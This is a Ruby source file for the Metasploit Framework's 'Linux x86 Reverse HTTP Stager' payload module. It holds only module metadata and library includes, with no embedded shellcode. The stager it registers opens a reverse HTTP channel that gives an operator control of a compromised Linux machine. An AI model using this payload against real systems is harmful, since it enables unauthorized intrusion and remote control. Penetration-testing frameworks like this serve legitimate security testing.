##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/linux/reverse_http'

module Metasploit4

  CachedSize = 327

  include Msf::Payload::Stager
  include Msf::Payload::Linux
  include Msf::Payload::Linux::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Linux x86 Reverse HTTP Stager',
      'Description' => 'Tunnel communication over HTTP',
      'Author'      => 'Jim Shaver',
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'sockedi http'))
  end

end
